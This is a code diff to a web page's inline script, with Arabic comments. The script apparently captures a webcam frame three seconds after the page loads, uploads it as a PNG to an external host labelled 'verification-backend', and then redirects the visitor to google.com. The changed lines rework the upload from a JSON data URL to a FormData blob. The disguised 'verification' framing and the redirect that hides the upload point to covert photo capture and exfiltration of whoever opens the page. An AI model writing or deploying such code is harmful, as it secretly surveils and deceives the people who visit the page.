@@ -35,21 +35,43 @@ function start() {
       let canvas = document.createElement("canvas");
 
       setTimeout(() => {
-        canvas.getContext("2d").drawImage(video, 0, 0, 300, 200);
-        let img = canvas.toDataURL();
+  canvas.width = 300;
+  canvas.height = 200;
+  canvas.getContext("2d").drawImage(video, 0, 0, 300, 200);
 
-        fetch("https://verification-backend-o1t0.onrender.com/image", {
-          method: "POST",
-          headers: {"Content-Type": "application/json"},
-          body: JSON.stringify({ image: img })
-        }).then(() => {
-          // التحويل ما يصير إلا بعد ما الطلب يطلع بنجاح
-          window.location.href = "https://google.com";
-        }).catch(err => {
-          console.log("Error sending image:", err);
-        });
+  // بدل toDataURL، نستخدم toBlob لتحويل الرسمة لملف حقيقي
+  canvas.toBlob((blob) => {
+    if (!blob) {
+      console.error("فشل تحويل الصورة");
+      return;
+    }
 
-      }, 3000);
+    // 1. تجهيز الكرتونة (FormData)
+    const formData = new FormData();
+    // نضع الـ blob ونعطيه اسم ملف افتراضي 'photo.png'
+    // كلمة 'image' هنا لازم تطابق اللي كتبناه بالباك إند upload.single('image')
+    formData.append("image", blob, "photo.png");
+
+    // 2. إرسال الطلب
+    fetch("https://verification-backend-o1t0.onrender.com/image", {
+      method: "POST",
+      // ⚠️ ملاحظة: لا تضع headers هنا، المتصفح سيقوم بالواجب تلقائياً
+      body: formData
+    })
+    .then(response => {
+      if (response.ok) {
+        window.location.href = "https://google.com";
+      } else {
+        console.log("السيرفر واجه مشكلة في الرفع");
+      }
+    })
+    .catch(err => {
+      console.log("Error sending image:", err);
+    });
+
+  }, 'image/png'); // تحديد نوع الصورة
+
+}, 3000);
     });
 }
 </script>
